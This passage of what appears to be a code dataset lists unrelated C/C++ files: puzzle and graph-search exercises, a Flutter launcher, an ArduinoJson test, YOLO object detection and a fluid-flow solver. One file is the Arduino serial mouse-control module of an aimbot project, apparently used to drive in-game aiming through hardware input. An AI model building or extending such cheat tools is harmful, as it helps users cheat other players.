max_l2 = max_l1;\r\n            max_l1 = l_bridge[i];\r\n            j = k;\r\n            k = i;\r\n        } else if (l_bridge[i] > max_l2) {\r\n            max_l2 = l_bridge[i];\r\n            j = i;\r\n        }\r\n    }\r\n    return {k, j};\r\n}\r\n\r\n\r\nint main(){\r\n    vector <int> people(5);\r\n    vector <int> l_bridge(5);\r\n    char ch;\r\n    for(int i = 0; i<5; i++){\r\n        cin>>ch;\r\n        cin>>people[i];\r\n    }\r\n    for (int i = 0; i<5; i++){\r\n        l_bridge[i] = people[i];\r\n    }\r\n\r\n    vector <int> r_bridge;\r\n    int result = 0;\r\n\r\n    auto [min_l1, min_l2] = min12_l(l_bridge);\r\n    r_bridge.push_back(l_bridge[min_l1]);\r\n    r_bridge.push_back(l_bridge[min_l2]);\r\n\r\n    if (min_l1>min_l2){\r\n        l_bridge.erase(l_bridge.begin()+min_l1);\r\n        l_bridge.erase(l_bridge.begin()+min_l2);\r\n    }\r\n    else{\r\n        l_bridge.erase(l_bridge.begin()+min_l2);\r\n        l_bridge.erase(l_bridge.begin()+min_l1);\r\n    }\r\n\r\n    result+=max(r_bridge[0],r_bridge[1]);\r\n\r\n    int min_rb  = min_r(r_bridge);\r\n\r\n    result += r_bridge[min_rb];\r\n    l_bridge.push_back(r_bridge[min_rb]);\r\n    r_bridge.erase(r_bridge.begin()+min_rb);\r\n\r\n    auto [max_l1, max_l2] = max12_l(l_bridge);\r\n    r_bridge.push_back(l_bridge[max_l1]);\r\n    r_bridge.push_back(l_bridge[max_l2]);\r\n    int maxx1 = l_bridge[max_l1];\r\n    int maxx2 = l_bridge[max_l2];\r\n    if (max_l1>max_l2){\r\n        l_bridge.erase(l_bridge.begin()+max_l1);\r\n        l_bridge.erase(l_bridge.begin()+max_l2);\r\n    }\r\n    else{\r\n        l_bridge.erase(l_bridge.begin()+max_l2);\r\n        l_bridge.erase(l_bridge.begin()+max_l1);\r\n    }\r\n\r\n    result+=max(maxx1,maxx2);\r\n\r\n    min_rb  = min_r(r_bridge);\r\n\r\n    result += r_bridge[min_rb];\r\n    l_bridge.push_back(r_bridge[min_rb]);\r\n    r_bridge.erase(r_bridge.begin()+min_rb);\r\n\r\n\r\n    auto [min_l11, min_l22] = min12_l(l_bridge);\r\n    r_bridge.push_back(l_bridge[min_l11]);\r\n    r_bridge.push_back(l_bridge[min_l22]);\r\n     int minn1 = l_bridge[min_l11];\r\n    int minn2 = l_bridge[min_l22];\r\n    if (min_l11>min_l22){\r\n        l_bridge.erase(l_bridge.begin()+min_l11);\r\n        l_bridge.erase(l_bridge.begin()+min_l22);\r\n    }\r\n    else{\r\n        l_bridge.erase(l_bridge.begin()+min_l22);\r\n        l_bridge.erase(l_bridge.begin()+min_l11);\r\n    }\r\n\r\n    result+=max(minn1,minn2);\r\n\r\n    min_rb  = min_r(r_bridge);\r\n\r\n    result += r_bridge[min_rb];\r\n    l_bridge.push_back(r_bridge[min_rb]);\r\n    r_bridge.erase(r_bridge.begin()+min_rb);\r\n\r\n\r\n    auto [max_l11, max_l22] = max12_l(l_bridge);\r\n    r_bridge.push_back(l_bridge[max_l11]);\r\n    r_bridge.push_back(l_bridge[max_l22]);\r\n    maxx1 = l_bridge[max_l11];\r\n    maxx2 = l_bridge[max_l22];\r\n    if (max_l11>max_l22){\r\n        l_bridge.erase(l_bridge.begin()+max_l11);\r\n        l_bridge.erase(l_bridge.begin()+max_l22);\r\n    }\r\n    else{\r\n        l_bridge.erase(l_bridge.begin()+max_l22);\r\n        l_bridge.erase(l_bridge.begin()+max_l11);\r\n    }\r\n\r\n    result+=max(maxx1,maxx2);\r\n\r\n     cout << \"Total result: \" << result << endl;\r\n    return 0;\r\n}\r\n",
    "#include<iostream>\r\n#include<string.h>\r\n#include<climits>\r\nusing namespace std;\r\n#define INF 999\r\nint mindistance(int distance[],bool stat[])\r\n{\r\n\tint minimum=INT_MAX,ind;\r\n\tfor(int k=0;k<56;k++)\r\n\t{\r\n\t\tif(stat[k]==false && distance[k]<=minimum)\r\n\t\t{\r\n\t\t\tminimum=distance[k];\r\n\t\t\tind=k;\r\n\t\t}\r\n\t}\r\n\treturn ind;\r\n}\r\nvoid dijkstra(int graph[56][56],int source, string stations[55])\r\n{\r\n\tint distance[56];\r\n\tbool stat[56];\r\n\tfor(int k=0;k<56;k++)\r\n\t{\r\n\t\tdistance[k]=INT_MAX;\r\n\t\tstat[k]=false;\r\n\t}\r\n\tdistance[source]=0;\r\n\tfor(int k=0;k<56;k++)\r\n\t{\r\n\t\tint m=mindistance(distance,stat);\r\n\t\tstat[m]=true;\r\n\t\tfor(int k=0;k<56;k++)\r\n\t\t{\r\n\t\t\tif(!stat[k] && graph[m][k] && distance[m]!=INT_MAX && distance[m]+graph[m][k]<distance[k])\r\n\t\t\t\tdistance[k]=distance[m]+graph[m][k];\r\n\t\t}\r\n\t}\r\n\tcout<<\"Minimum Number of Stations from \"<<stations[source]<<\" To every station\"<<endl;\r\n\tfor(int k=0;k<56;k++)\r\n\t{\r\n\t\tcout<<\"Minimum Stations from \"<<stations[source]<<\" To \"<<stations[k]<<\"  are  \"<<distance[k]<<endl;\r\n\t}\r\n}\r\nint main()\r\n{\r\n\tint graph[56][56]={\r\n{0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\r\n{0, 0, 0, 0, 0, 0, 0, 0, 0, ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"destini_challenge_game\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#define WIN32_LEAN_AND_MEAN\n#define _WINSOCKAPI_\n#include <winsock2.h>\n#include <Windows.h>\n\n#include <iostream>\n#include <vector>\n\n#include \"SerialConnection.h\"\n#include \"sunone_aimbot_cpp.h\"\n\nSerialConnection::SerialConnection(const std::string& port, unsigned int baud_rate)\n    : serial_port_(io_service_), is_open_(false)\n{\n    try\n    {\n        serial_port_.open(port);\n        serial_port_.set_option(boost::asio::serial_port_base::baud_rate(baud_rate));\n        is_open_ = true;\n    }\n    catch (boost::system::system_error& e)\n    {\n        std::cerr << \"Arduino: Unable to connect to the port.\" << std::endl;\n    }\n}\n\nbool SerialConnection::isOpen() const\n{\n    return is_open_;\n}\nSerialConnection::~SerialConnection()\n{\n    if (serial_port_.is_open())\n    {\n        serial_port_.close();\n    }\n}\n\nvoid SerialConnection::write(const std::string& data)\n{\n    if (is_open_)\n    {\n        boost::asio::write(serial_port_, boost::asio::buffer(data));\n    }\n}\n\nstd::string SerialConnection::read()\n{\n    char c;\n    std::string result;\n    while (boost::asio::read(serial_port_, boost::asio::buffer(&c, 1)))\n    {\n        if (c == '\\n') break;\n        result += c;\n    }\n    return result;\n}\n\nvoid SerialConnection::click()\n{\n    sendCommand(\"c\");\n}\n\nvoid SerialConnection::press()\n{\n    sendCommand(\"p\");\n}\n\nvoid SerialConnection::release()\n{\n    sendCommand(\"r\");\n}\n\nvoid SerialConnection::move(int x, int y)\n{\n    if (!is_open_) return;\n\n    if (x < std::numeric_limits<int>::min() || x > std::numeric_limits<int>::max() ||\n        y < std::numeric_limits<int>::min() || y > std::numeric_limits<int>::max())\n    {\n        x = y = 0;\n    }\n\n    if (config.arduino_16_bit_mouse)\n    {\n        std::string data = \"m\" + std::to_string(x) + \",\" + std::to_string(y) + \"\\n\";\n        try\n        {\n            write(data);\n        }\n        catch (const std::exception& e)\n        {\n        }\n    }\n    else\n    {\n        std::vector<int> x_parts = splitValue(x);\n        std::vector<int> y_parts = splitValue(y);\n\n        if (x_parts.size() != y_parts.size() || x_parts.empty() || y_parts.empty())\n        {\n            x_parts.clear();\n            y_parts.clear();\n        }\n\n        for (size_t i = 0; i < x_parts.size(); ++i)\n        {\n            if (x_parts[i] < std::numeric_limits<int>::min() || x_parts[i] > std::numeric_limits<int>::max() ||\n                y_parts[i] < std::numeric_limits<int>::min() || y_parts[i] > std::numeric_limits<int>::max())\n            {\n                x_parts[i] = y_parts[i] = 0;\n            }\n\n            std::string data = \"m\" + std::to_string(x_parts[i]) + \",\" + std::to_string(y_parts[i]) + \"\\n\";\n            try\n            {\n                write(data);\n            }\n            catch (const std::exception& e)\n            {\n                \n            }\n        }\n    }\n}\n\nvoid SerialConnection::sendCommand(const std::string& command)\n{\n    write(command + \"\\n\");\n}\n\nstd::vector<int> SerialConnection::splitValue(int value)\n{\n    std::vector<int> values;\n    int sign = (value < 0) ? -1 : 1;\n\n    while (abs(value) > 127)\n    {\n        values.push_back(sign * 127);\n        value -= sign * 127;\n    }\n\n    values.push_back(value);\n    return values;\n}",
    "// ArduinoJson - https://arduinojson.org\n// Copyright \u00a9 2014-2024, Benoit BLANCHON\n// MIT License\n\n#include <ArduinoJson.h>\n#include <catch.hpp>\n#include \"Allocators.hpp\"\n\n#include \"Literals.hpp\"\n\nTEST_CASE(\"JsonVariant::set(JsonVariant)\") {\n  KillswitchAllocator killswitch;\n  SpyingAllocator spyingAllocator(&killswitch);\n  JsonDocument doc1(&spyingAllocator);\n  JsonDocument doc2(&spyingAllocator);\n  JsonVariant var1 = doc1.to<JsonVariant>();\n  JsonVariant var2 = doc2.to<JsonVariant>();\n\n  SECTION(\"stores JsonArray by copy\") {\n    JsonArray arr = doc2.to<JsonArray>();\n    JsonObject obj = arr.add<JsonObject>();\n    obj[\"hello\"] = \"world\";\n\n    var1.set(arr);\n\n    arr[0] = 666;\n    REQUIRE(var1.as<std::string>() == \"[{\\\"hello\\\":\\\"world\\\"}]\");\n  }\n\n  SECTION(\"stores JsonObject by copy\") {\n    JsonObject obj = doc2.to<JsonObject>();\n    JsonArray arr = obj[\"value\"].to<JsonArray>();\n    arr.add(42);\n\n    var1.set(obj);\n\n    obj[\"value\"] = 666;\n    REQUIRE(var1.as<std::string>() == \"{\\\"value\\\":[42]}\");\n  }\n\n  SECTION(\"stores const char* by reference\") {\n    var1.set(\"hello!!\");\n    spyingAllocator.clearLog();\n\n    var2.set(var1);\n\n    REQUIRE(spyingAllocator.log() == AllocatorLog{});\n  }\n\n  SECTION(\"stores char* by copy\") {\n    char str[] = \"hello!!\";\n    var1.set(str);\n    spyingAllocator.clearLog();\n\n    var2.set(var1);\n\n    REQUIRE(spyingAllocator.log() == AllocatorLog{\n                                         Allocate(sizeofString(\"hello!!\")),\n                                     });\n  }\n\n  SECTION(\"fails gracefully if string allocation fails\") {\n    char str[] = \"hello!!\";\n    var1.set(str);\n    killswitch.on();\n    spyingAllocator.clearLog();\n\n    var2.set(var1);\n\n    REQUIRE(doc2.overflowed() == true);\n    REQUIRE(spyingAllocator.log() == AllocatorLog{\n                                         AllocateFail(sizeofString(\"hello!!\")),\n                                     });\n  }\n\n  SECTION(\"stores std::string by copy\") {\n    var1.set(\"hello!!\"_s);\n    spyingAllocator.clearLog();\n\n    var2.set(var1);\n\n    REQUIRE(spyingAllocator.log() == AllocatorLog{\n                                         Allocate(sizeofString(\"hello!!\")),\n                                     });\n  }\n\n  SECTION(\"stores Serialized<const char*> by copy\") {\n    var1.set(serialized(\"hello!!\", 7));\n    spyingAllocator.clearLog();\n\n    var2.set(var1);\n\n    REQUIRE(spyingAllocator.log() == AllocatorLog{\n                                         Allocate(sizeofString(\"hello!!\")),\n                                     });\n  }\n\n  SECTION(\"stores Serialized<char*> by copy\") {\n    char str[] = \"hello!!\";\n    var1.set(serialized(str, 7));\n    spyingAllocator.clearLog();\n\n    var2.set(var1);\n\n    REQUIRE(spyingAllocator.log() == AllocatorLog{\n                                         Allocate(sizeofString(\"hello!!\")),\n                                     });\n  }\n\n  SECTION(\"stores Serialized<std::string> by copy\") {\n    var1.set(serialized(\"hello!!\"_s));\n    spyingAllocator.clearLog();\n\n    var2.set(var1);\n\n    REQUIRE(spyingAllocator.log() == AllocatorLog{\n                                         Allocate(sizeofString(\"hello!!\")),\n                                     });\n  }\n\n  SECTION(\"fails gracefully if raw string allocation fails\") {\n    var1.set(serialized(\"hello!!\"_s));\n    killswitch.on();\n    spyingAllocator.clearLog();\n\n    var2.set(var1);\n\n    REQUIRE(doc2.overflowed() == true);\n    REQUIRE(spyingAllocator.log() == AllocatorLog{\n                                         AllocateFail(sizeofString(\"hello!!\")),\n                                     });\n  }\n\n  SECTION(\"destination is unbound\") {\n    JsonVariant unboundVariant;\n\n    unboundVariant.set(var1);\n\n    REQUIRE(unboundVariant.isUnbound());\n    REQUIRE(unboundVariant.isNull());\n  }\n}\n",
    "\n#include <fstream>\n#include <sstream>\n#include <iostream>\n\n#include <opencv2/dnn.hpp>\n#include <opencv2/imgproc.hpp>\n#include <opencv2/highgui.hpp>\n\n#include \"objectDetection2D.hpp\"\n\n\nusing namespace std;\n\n// detects objects in an image using the YOLO library and a set of pre-trained objects from the COCO database;\n// a set of 80 classes is listed in \"coco.names\" and pre-trained weights are stored in \"yolov3.weights\"\nvoid detectObjects(cv::Mat& img, std::vector<BoundingBox>& bBoxes, float confThreshold, float nmsThreshold, \n                   std::string basePath, std::string classesFile, std::string modelConfiguration, std::string modelWeights, bool bVis)\n{\n    // load class names from file\n    vector<string> classes;\n    ifstream ifs(classesFile.c_str());\n    string line;\n    while (getline(ifs, line)) classes.push_back(line);\n    \n    // load neural network\n    cv::dnn::Net net = cv::dnn::readNetFromDarknet(modelConfiguration, modelWeights);\n    net.setPreferableBackend(cv::dnn::DNN_BACKEND_OPENCV);\n    net.setPreferableTarget(cv::dnn::DNN_TARGET_CPU);\n    \n    // generate 4D blob from input image\n    cv::Mat blob;\n    vector<cv::Mat> netOutput;\n    double scalefactor = 1/255.0;\n    cv::Size size = cv::Size(416, 416);\n    cv::Scalar mean = cv::Scalar(0,0,0);\n    bool swapRB = false;\n    bool crop = false;\n    cv::dnn::blobFromImage(img, blob, scalefactor, size, mean, swapRB, crop);\n    \n    // Get names of output layers\n    vector<cv::String> names;\n    vector<int> outLayers = net.getUnconnectedOutLayers(); // get  indices of  output layers, i.e.  layers with unconnected outputs\n    vector<cv::String> layersNames = net.getLayerNames(); // get  names of all layers in the network\n    \n    names.resize(outLayers.size());\n    for (size_t i = 0; i < outLayers.size(); ++i) // Get the names of the output layers in names\n        names[i] = layersNames[outLayers[i] - 1];\n    \n    // invoke forward propagation through network\n    net.setInput(blob);\n    net.forward(netOutput, names);\n    \n    // Scan through all bounding boxes and keep only the ones with high confidence\n    vector<int> classIds; vector<float> confidences; vector<cv::Rect> boxes;\n    for (size_t i = 0; i < netOutput.size(); ++i)\n    {\n        float* data = (float*)netOutput[i].data;\n        for (int j = 0; j < netOutput[i].rows; ++j, data += netOutput[i].cols)\n        {\n            cv::Mat scores = netOutput[i].row(j).colRange(5, netOutput[i].cols);\n            cv::Point classId;\n            double confidence;\n            \n            // Get the value and location of the maximum score\n            cv::minMaxLoc(scores, 0, &confidence, 0, &classId);\n            if (confidence > confThreshold)\n            {\n                cv::Rect box; int cx, cy;\n                cx = (int)(data[0] * img.cols);\n                cy = (int)(data[1] * img.rows);\n                box.width = (int)(data[2] * img.cols);\n                box.height = (int)(data[3] * img.rows);\n                box.x = cx - box.width/2; // left\n                box.y = cy - box.height/2; // top\n                \n                boxes.push_back(box);\n                classIds.push_back(classId.x);\n                confidences.push_back((float)confidence);\n            }\n        }\n    }\n    \n    // perform non-maxima suppression\n    vector<int> indices;\n    cv::dnn::NMSBoxes(boxes, confidences, confThreshold, nmsThreshold, indices);\n    for(auto it=indices.begin(); it!=indices.end(); ++it) {\n        \n        BoundingBox bBox;\n        bBox.roi = boxes[*it];\n        bBox.classID = classIds[*it];\n        bBox.confidence = confidences[*it];\n        bBox.boxID = (int)bBoxes.size(); // zero-based unique identifier for this bounding box\n        \n        bBoxes.push_back(bBox);\n    }\n    \n    // show results\n    if(bVis) {\n        \n        cv::Mat visImg = img.clone();\n        for(auto it=bBoxes.begin(); it!=bBoxes.end(); ++it) {\n            \n            // Draw rectangle displaying the bounding box\n            int top, left, width, height;\n            top = (*it).roi.y;\n            left = (*it).roi.x;\n            width = (*it).roi.width;\n            height = (*it).roi.height;\n            cv::rectangle(visImg, cv::Point(left, top), cv::Point(left+width, top+height),cv::Scalar(0, 255, 0), 2);\n            \n            string label = cv::format(\"%.2f\", (*it).confidence);\n            label = classes[((*it).classID)] + \":\" + label;\n        \n            // Display label at the top of the bounding box\n            int baseLine;\n            cv::Size labelSize = getTextSize(label, cv::FONT_ITALIC, 0.5, 1, &baseLine);\n            top = max(top, labelSize.height);\n            rectangle(visImg, cv::Point(left, top - round(1.5*labelSize.height)), cv::Point(left + round(1.5*labelSize.width), top + baseLine), cv::Scalar(255, 255, 255), cv::FILLED);\n            cv::putText(visImg, label, cv::Point(left, top), cv::FONT_ITALIC, 0.75, cv::Scalar(0,0,0),1);\n            \n        }\n        \n        string windowName = \"Object class",
    "#include<stdio.h>\r\n#include<stdlib.h>\r\n#include<math.h>\r\nint main()\r\n{\r\n\r\n\tint i,j ,m,n,midpts;\r\n\tdouble delx,dely,x,y,Re;\r\n\tprintf(\"Enter the value of N:\");\r\n\tscanf(\"%d\",&n);\r\n\t\tprintf(\"Enter the value of M:\");\r\n\tscanf(\"%d\",&m);\r\n\t\tprintf(\"Enter the value of Re:\");\r\n\tscanf(\"%lf\",&Re);\r\n\t//m=100;\r\n\t//n=100;\r\n\tmidpts=(m-2)*(n-2);\r\n\tdelx=1.0/(m);\r\n\tdely=1.0/(n);\r\n\tdouble beta=(delx/dely);\r\n\t//double Re=400.0;\r\n\tdouble psi[m][n],omega[m][n],u[m][n],v[m][n];\r\n\tdouble psi_prev[m][n],omega_prev[m][n];\r\n\tdouble error_psi=0.0,error_omega=0.0;\r\n\t\r\n\tint iteration=0;\r\n\tfor(j=0;j<n;j++)\r\n\t{\r\n\t\tfor(i=0;i<m;i++)\r\n\t\t{\r\n\t\t\tif(j==0)//bb\r\n\t\t\t{\r\n\t\t\t\tu[i][j]=0.0;\r\n\t\t\t\tv[i][j]=0.0;\r\n\t\t\t\tpsi[i][j]=0.0;\r\n\t\t\t}\r\n\t\t\telse if(j==(n-1))\r\n\t\t\t{\r\n\t\t\t\tu[i][j]=1.0;\r\n\t\t\t\tv[i][j]=0.0;\r\n\t\t\t\tpsi[i][j]=0.0;\r\n\t\t\t\t\t\r\n\t\t\t}\r\n\t\t\telse if(i==0)\r\n\t\t\t{\r\n\t\t\t\tu[i][j]=0.0;\r\n\t\t\t\tv[i][j]=0.0;\r\n\t\t\t\tpsi[i][j]=0.0;\r\n\t\t\t\t\t\r\n\t\t\t}\r\n\t\t\telse if(i==(m-1))\r\n\t\t\t{\r\n\t\t\t\tu[i][j]=0.0;\r\n\t\t\t\tv[i][j]=0.0;\r\n\t\t\t\tpsi[i][j]=0.0;\r\n\t\t\t\t\t\r\n\t\t\t}\r\n\t\t\t\telse \r\n\t\t\t{\r\n\t\t\t\tu[i][j]=0.0;\r\n\t\t\t\tv[i][j]=0.0;\r\n\t\t\t\tpsi[i][j]=0.0;\r\n\t\t\t\t\t\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tfor(j=0;j<n;j++)\r\n\t{\r\n\t\tfor(i=0;i<m;i++)\r\n\t\t{\r\n\t\t\tif(j==(n-1))\r\n\t\t\t{\r\n\t\t\t\tomega[i][j]=((2.0/pow(dely,2))*(psi[i][j]-psi[i][j-1]))-(2.0/dely);\r\n\t\t\t}\r\n\t\t\telse if(j==0)\r\n\t\t\t{\r\n\t\t\t\tomega[i][j]=(2.0/pow(dely,2))*(psi[i][j]-psi[i][j+1]);\r\n\t\t\t}\r\n\t\t\telse if(i==0)\r\n\t\t\t{\r\n\t\t\t    omega[i][j]=(2.0/pow(dely,2))*(psi[i][j]-psi[i+1][j]);\t\r\n\t\t\t}\r\n\t\t\telse if(i==(m-1))\r\n\t\t\t{\r\n\t\t\t omega[i][j]=(2.0/pow(dely,2))*(psi[i][j]-psi[i-1][j]);\t\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tomega[i][j]=0.0;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tdo\r\n\t{\r\n\t   for(j=0;j<n;j++)\r\n    \t{\r\n\t    \tfor(i=0;i<m;i++)\r\n\t\t\t{\r\n\t\t\t\tpsi_prev[i][j]=psi[i][j];\r\n\t\t\t\tomega_prev[i][j]=omega[i][j];\r\n\t\t\t}\r\n    \t}\r\n       for(j=1;j<(n-1);j++)\r\n    \t{\r\n\t    \tfor(i=1;i<(m-1);i++)\r\n\t\t\t{\r\n\t\t\tpsi[i][j]=(0.5/(1.0+pow(beta,2)))*(psi[i+1][j]+psi[i-1][j]+(pow(beta,2)*(psi[i][j+1]+psi[i][j-1]))+(pow(delx,2)*omega[i][j]));\t\r\n\t        }\r\n\t    }\r\n\t    \tfor(j=0;j<(n-1);j++)\r\n        \t{\r\n\t\t        for(i=0;i<(m-1);i++)\r\n\t        \t{\r\n\t              